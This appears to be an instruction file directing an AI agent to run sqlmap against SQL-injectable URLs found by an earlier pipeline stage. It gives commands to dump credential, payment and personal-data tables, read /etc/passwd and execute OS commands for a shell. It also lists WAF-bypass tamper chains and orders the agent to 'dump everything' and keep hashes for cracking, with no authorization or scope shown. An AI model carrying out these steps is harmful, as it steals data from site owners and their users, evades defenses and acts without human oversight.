# Task 44: SQLMap Deep SQL Injection Exploitation
# ==============================================================================
# JULES AI AGENT INSTRUCTIONS - FULL BRAIN MODE
# ==============================================================================

## TASK IDENTITY
- **Task Number**: 44
- **Task Name**: SQLMap Deep SQL Injection Exploitation
- **Category**: Phase 4 - Injection Testing
- **Depends On**: Task 43 (Ghauri SQLi Triage)
- **AI Brain**: sqlmap_exploiter.py

## PURPOSE
Take CONFIRMED and POSSIBLE SQLi targets from Task 43 Ghauri and perform
DEEP exploitation to:
1. Confirm vulnerability
2. Extract database names
3. Extract table names
4. Dump sensitive data (credentials, PII)
5. Test for OS command execution
6. Test for file read/write

## INPUT FILES (FROM TASK 43)

```
PRIMARY INPUT:
â”œâ”€â”€ outputs/sqli/sqlmap_priority_targets.json    # Prioritized targets with metadata
â”œâ”€â”€ outputs/sqli/sqlmap_priority_targets.txt     # Simple URL list
â”œâ”€â”€ outputs/sqli/ghauri_vulnerable.txt           # Confirmed SQLi (HIGHEST PRIORITY)
â””â”€â”€ outputs/sqli/ghauri_possible.txt             # Possible SQLi

INTELLIGENCE SOURCES:
â”œâ”€â”€ outputs/waf/waf_results.json                 # WAF detection (Task 32)
â”œâ”€â”€ outputs/nuclei/tech_stack.json               # DB type detection (Task 35)
â””â”€â”€ outputs/sqli/ghauri_full_results.json        # Technique hints from Ghauri
```

## OUTPUT FILES

```
outputs/sqli/
â”œâ”€â”€ sqlmap_confirmed.txt          # SQLMap-confirmed vulnerable URLs
â”œâ”€â”€ sqlmap_dumps/                 # Extracted data
â”‚   â”œâ”€â”€ {hash}/                   # Per-target dump
â”‚   â”‚   â”œâ”€â”€ dbs.txt               # Database names
â”‚   â”‚   â”œâ”€â”€ tables_{db}.txt       # Table names per DB
â”‚   â”‚   â””â”€â”€ dump_{db}_{table}.csv # Actual data dumps
â”œâ”€â”€ sqlmap_full_results.json      # Complete results
â””â”€â”€ critical_findings.json        # High-value extractions (creds, tokens)

outputs/vulnerabilities/
â”œâ”€â”€ SQLI-SQLMAP-{hash}-CRITICAL.md  # Per-vuln reports with evidence
â””â”€â”€ DATA-LEAK-{hash}-CRITICAL.md    # Data extraction reports
```

## SQLMAP COMMAND STRATEGY

### Phase 1: Confirm & Enumerate DBs
```bash
# Use metadata from Ghauri
sqlmap -u "{url}" \
    --batch \
    --level=3 --risk=3 \
    --technique={ghauri_technique} \   # B/E/T/U/S
    --dbms={detected_db} \             # MySQL/PostgreSQL/MSSQL/Oracle
    --dbs \
    --tamper={waf_tampers}
```

### Phase 2: Enumerate Tables
```bash
sqlmap -u "{url}" \
    --batch \
    -D {database_name} \
    --tables
```

### Phase 3: Dump Sensitive Tables
Target tables (priority order):
- users, accounts, admins, members
- credentials, passwords, tokens, secrets
- customers, clients, orders
- payment, billing, credit_card
- settings, config

```bash
sqlmap -u "{url}" \
    --batch \
    -D {database_name} \
    -T {table_name} \
    --dump
```

### Phase 4: Advanced Exploitation (if --os-pwn possible)
```bash
# Test for OS command execution
sqlmap -u "{url}" --batch --os-cmd="whoami"

# Test for file read
sqlmap -u "{url}" --batch --file-read="/etc/passwd"

# Test for file write (proof of concept only)
sqlmap -u "{url}" --batch --file-write="poc.txt" --file-dest="/tmp/poc.txt"
```

## WAF-AWARE TAMPER SCRIPTS

```yaml
cloudflare:
  - between
  - randomcase
  - space2comment
  - charencode
  - equaltolike

akamai:
  - charencode
  - chardoubleencode
  - space2plus
  - between
  - apostrophemask

aws_waf:
  - apostrophemask
  - base64encode
  - between
  - randomcase
  - space2plus

imperva:
  - modsecurityversioned
  - space2morehash
  - between
  - randomcomments
  - percentage

modsecurity:
  - modsecurityzeroversioned
  - space2mysqldash
  - between
  - randomcomments

f5_big_ip:
  - percentage
  - charencode
  - randomcomments
  - space2mssqlblank
  - apostrophemask
```

## DATABASE-SPECIFIC OPTIMIZATIONS

```yaml
mysql:
  techniques: "BETUS"  # All techniques
  tampers: ["space2comment", "equaltolike"]
  dump_opts: ["--hex"]

postgresql:
  techniques: "BETUS"
  tampers: ["greatest", "between"]
  dump_opts: ["--sql-shell"]

mssql:
  techniques: "BETUS"
  tampers: ["space2mssqlblank", "percentage"]
  dump_opts: ["--msf-path"]

oracle:
  techniques: "BETU"  # No stacked queries
  tampers: ["charencode", "space2comment"]
  dump_opts: []
```

## SENSITIVE TABLE DETECTION

```python
SENSITIVE_TABLE_PATTERNS = [
    # Authentication
    r'user', r'admin', r'account', r'member',
    r'login', r'auth', r'session', r'token',
    r'credential', r'password', r'secret',
    
    # Personal Data
    r'customer', r'client', r'person', r'profile',
    r'employee', r'staff', r'contact',
    
    # Financial
    r'payment', r'transaction', r'order',
    r'billing', r'invoice', r'credit',
    r'card', r'bank', r'balance',
    
    # Sensitive Config
    r'config', r'setting', r'option',
    r'key', r'api', r'secret',
]

SENSITIVE_COLUMN_PATTERNS = [
    r'password', r'passwd', r'pwd', r'hash',
    r'token', r'secret', r'key', r'api',
    r'email', r'phone', r'ssn', r'dob',
    r'credit', r'card', r'cvv', r'expir',
    r'salt', r'session', r'auth',
]
```

## AI BRAIN: sqlmap_exploiter.py

```
Class Structure:
â”œâ”€â”€ SQLMapExploiter
â”‚   â”œâ”€â”€ __init__()               # Load targets & intelligence
â”‚   â”œâ”€â”€ exploit_all()            # Main entry point
â”‚   â”œâ”€â”€ _exploit_single()        # Single target exploitation
â”‚   â”œâ”€â”€ _enumerate_dbs()         # Phase 1: Get DBs
â”‚   â”œâ”€â”€ _enumerate_tables()      # Phase 2: Get tables
â”‚   â”œâ”€â”€ _dump_table()            # Phase 3: Dump data
â”‚   â”œâ”€â”€ _test_os_access()        # Phase 4: OS commands
â”‚   â”œâ”€â”€ _is_sensitive_table()    # AI: detect sensitive tables
â”‚   â”œâ”€â”€ _extract_credentials()   # AI: extract creds from dumps
â”‚   â”œâ”€â”€ _write_vuln_report()     # Generate CRITICAL report
â”‚   â””â”€â”€ _write_data_leak_report() # Generate DATA-LEAK report
â”‚
â”œâ”€â”€ TargetLoader
â”‚   â”œâ”€â”€ load_from_ghauri()       # Load Task 43 results
â”‚   â””â”€â”€ prioritize()             # Sort by technique success
â”‚
â””â”€â”€ WAFHandler
    â”œâ”€â”€ load_waf_info()          # From Task 32
    â””â”€â”€ get_tamper_chain()       # Build tamper string
```

## EXECUTION FLOW

```
1. LOAD TARGETS
   - Read outputs/sqli/sqlmap_priority_targets.json
   - Load outputs/sqli/ghauri_vulnerable.txt
   - Prioritize: confirmed > possible > timeout

2. FOR EACH TARGET (with 9-minute batch limit):
   a. Load WAF info for host
   b. Load DB type if known
   c. Run Phase 1: Enumerate databases
   d. If DBs found:
      - Run Phase 2: Enumerate tables (all DBs)
      - AI: Identify sensitive tables
      - Run Phase 3: Dump sensitive tables
      - AI: Extract credentials/tokens
   e. If stacked queries work:
      - Test Phase 4: OS commands (FULL RCE exploitation)

3. GENERATE REPORTS
   - Per-vulnerability: SQLI-SQLMAP-{hash}-CRITICAL.md
   - Data leaks: DATA-LEAK-{hash}-CRITICAL.md
   - Summary: sqlmap_full_results.json

4. CHECKPOINT/RESUME
   - Save progress after each target
   - Resume from last completed on restart
```

## TIME MANAGEMENT

```
SQLMap is SLOW by design (thorough testing)

Per-target time budget:
- Phase 1 (DBs):     2-5 minutes
- Phase 2 (Tables):  3-10 minutes per DB
- Phase 3 (Dump):    5-30 minutes per table
- Phase 4 (OS):      1-2 minutes

Strategy:
- Limit to 10-20 high-priority targets per batch
- Use --batch to avoid prompts
- Use --time-sec=5 for time-based (not too slow)
- Checkpoint after each target
```

## OUTPUT FORMAT: VULNERABILITY REPORT

```markdown
# SQL Injection: SQLI-SQLMAP-{hash}

## Summary
| Field | Value |
|-------|-------|
| **ID** | SQLI-SQLMAP-{hash} |
| **URL** | {url} |
| **Parameter** | {param} |
| **Technique** | {technique} |
| **Database** | {db_type} {db_name} |
| **Severity** | CRITICAL |

## Databases Found
- database1 (5 tables)
- database2 (12 tables)

## Sensitive Tables
| Database | Table | Rows | Contains |
|----------|-------|------|----------|
| app | users | 5,234 | emails, hashed passwords |
| app | api_keys | 89 | API tokens |

## Extracted Credentials
| Username | Password Hash | Algorithm |
|----------|---------------|-----------|
| admin | $2y$... | bcrypt |
| john | 5f4dcc... | MD5 |

## OS Access
- Command execution: NO / YES
- File read: NO / YES
- File write: NO / YES

## Evidence
[Full SQLMap output excerpt]
```

## OUTPUT FORMAT: DATA LEAK REPORT

```markdown
# Data Leak: DATA-LEAK-{hash}

## Summary
| Field | Value |
|-------|-------|
| **ID** | DATA-LEAK-{hash} |
| **Source** | SQLi at {url} |
| **Records** | {count} rows |
| **Data Type** | Credentials / PII / Financial |
| **Severity** | CRITICAL |

## Data Sample
[First 10 rows - sanitized for report]

## Full Dump Location
temp/task44/dumps/{hash}/{db}_{table}.csv
```

## EXPLOITATION RULES

```
1. YOUR target = GO FULL EXPLOITATION
2. DUMP EVERYTHING - Full database extraction allowed
3. CREDENTIAL HANDLING:
   - Extract all credentials
   - Store in outputs/vulnerabilities/
4. OS COMMANDS - Full command execution, get shell if possible
5. FILE READ - Read ALL interesting files, not just proof
```

## HOW TO RUN

```bash
# Full exploitation of Ghauri targets
python sqlmap_exploiter.py --workspace d:\wallet\Mylab

# Resume interrupted exploitation
python sqlmap_exploiter.py --workspace d:\wallet\Mylab --resume

# Limit targets for quick test
python sqlmap_exploiter.py --workspace d:\wallet\Mylab --max-targets 5

# Skip Phase 4 (OS tests)
python sqlmap_exploiter.py --workspace d:\wallet\Mylab --skip-os
```

## INTEGRATION CHAIN

```
Task 16 (Arjun)    â”€â”
Task 17 (Kiterunner)â”œâ”€â–º Task 43 (Ghauri) â”€â–º Task 44 (SQLMap) â”€â–º vulnerabilities/
Task 29 (HAR)      â”€â”¤                         â”‚
Task 41 (ZAP)      â”€â”˜                         â”‚
                                              â–¼
                                   Task 45 (NoSQLMap) for MongoDB
```

## HANDOFF TO TASK 45

If MongoDB detected in:
- Nuclei tech_stack.json shows MongoDB
- URL paths contain /mongo/, /nosql/
- Table enumeration fails but endpoints respond

Then create:
```
outputs/sqli/nosqlmap_targets.txt
```
For Task 45 to process.

## AI AGENT CREATIVITY DIRECTIVE

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ SQLMap is a TOOL - you are the BRAIN that directs it intelligently.         â”‚
â”‚                                                                             â”‚
â”‚ THINK BEFORE RUNNING:                                                       â”‚
â”‚                                                                             â”‚
â”‚ 1. WHAT DB TYPE? Don't guess - use Ghauri hints, error messages, tech stack â”‚
â”‚    - Error shows "MySQL syntax" â†’ --dbms=mysql                              â”‚
â”‚    - .NET app â†’ likely MSSQL                                                â”‚
â”‚    - PostgreSQL error â†’ --dbms=postgresql                                   â”‚
â”‚                                                                             â”‚
â”‚ 2. WHAT TECHNIQUE WORKED? Use Ghauri's confirmed technique                  â”‚
â”‚    - Boolean-based â†’ --technique=B                                          â”‚
â”‚    - Time-based â†’ --technique=T                                             â”‚
â”‚    - Don't waste time on techniques already proven to fail                  â”‚
â”‚                                                                             â”‚
â”‚ 3. WHAT'S VALUABLE? Don't dump everything blindly                           â”‚
â”‚    - Look for: users, accounts, credentials, tokens, secrets                â”‚
â”‚    - Skip: logs, sessions, cache tables                                     â”‚
â”‚                                                                             â”‚
â”‚ 4. ADAPT TO FAILURES:                                                       â”‚
â”‚    - If tamper fails â†’ try different tamper                                 â”‚
â”‚    - If WAF blocks â†’ increase delay, try chunked encoding                   â”‚
â”‚    - If columns unknown â†’ use --columns first, then targeted dump           â”‚
â”‚                                                                             â”‚
â”‚ CHAIN YOUR FINDINGS:                                                        â”‚
â”‚    - Found admin password hash? â†’ Note for offline cracking                 â”‚
â”‚    - Found API keys in config? â†’ Flag as separate critical finding          â”‚
â”‚    - Found other DB users? â†’ Test their permissions                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
